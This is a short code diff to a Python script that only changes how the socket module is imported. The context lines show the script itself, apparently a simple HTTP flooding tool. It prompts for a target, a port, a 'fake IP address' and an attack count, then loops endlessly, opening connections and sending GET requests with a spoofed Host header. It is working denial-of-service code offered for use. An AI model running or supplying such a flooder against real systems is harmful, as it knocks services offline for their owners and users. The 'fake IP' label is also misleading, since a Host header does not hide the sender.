@@ -1,4 +1,4 @@
-import socket
+from socket import socket, AF_INET, SOCK_STREAM
 import threading
 
 fake_ip = input("Fake IP address: ")
@@ -10,7 +10,7 @@ attack_count = int(input("Amount of attacks: "))
 def attack(count):
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = socket(AF_INET, SOCK_STREAM)
             s.connect((target, port))
             s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
             s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
